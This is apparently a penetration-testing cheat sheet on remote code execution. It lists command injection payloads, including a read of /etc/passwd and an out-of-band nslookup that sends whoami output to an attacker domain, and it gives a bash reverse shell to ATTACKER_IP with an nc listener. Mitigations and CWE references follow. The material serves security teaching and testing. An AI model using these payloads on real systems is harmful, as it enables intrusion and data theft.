# What is RCE?

Remote Code Execution (RCE) lets an attacker run their own commands or code on a target server. It is the top prize in most engagements because it usually means full control of the host. RCE often chains from something smaller - a file upload, a deserialization bug, or command injection in a shell call.

## Common sources

- **OS command injection** - user input passed to a shell (`system()`, `exec()`, backticks)
- **Code injection** - input reaches `eval()` or a template engine
- **Insecure deserialization** - crafted objects trigger gadget chains
- **File upload + include** - upload a web shell, then request it

## Test payloads

```bash
# Command injection separators
; id
| id
& id
`id`
$(id)

# Break out then chain
127.0.0.1; cat /etc/passwd
127.0.0.1 && whoami

# Blind - confirm with a delay or an out-of-band ping
; sleep 5
; nslookup $(whoami).attacker.oastify.com
```

## Tools

- [Burp Suite Collaborator](https://portswigger.net/burp) - catch blind/out-of-band callbacks
- [interactsh](https://github.com/projectdiscovery/interactsh) - open-source OAST server
- [commix](https://github.com/commixproject/commix) - automated command injection

## Getting a shell

```bash
# Listener on your box
nc -lvnp 4444

# Reverse shell payload to inject
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Upgrade to a proper TTY
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

## Manual testing

1. Find any input that reaches a system call, template, or deserializer
2. Inject a separator and a harmless command like `id`
3. If nothing reflects, go blind: use `sleep` or an OAST callback
4. Confirm execution context (`whoami`, `hostname`)
5. Escalate to a reverse shell only within scope

## Mitigation

- Never pass user input to a shell; use language APIs with argument arrays
- Avoid `eval` and dynamic code loading on untrusted data
- Patch known-vulnerable libraries (deserialization gadgets)
- Run services as a low-privilege user; sandbox with containers/seccomp
- Egress-filter the server so reverse shells cannot dial out

## Deep dive

- [RCE - Vulnerability Explain](https://securitycipher.com/vulnerability-explain/)
- [PortSwigger OS command injection labs](https://portswigger.net/web-security/os-command-injection)

## CWE

- CWE-94: Improper Control of Generation of Code
- CWE-78: Improper Neutralization of Special Elements used in an OS Command
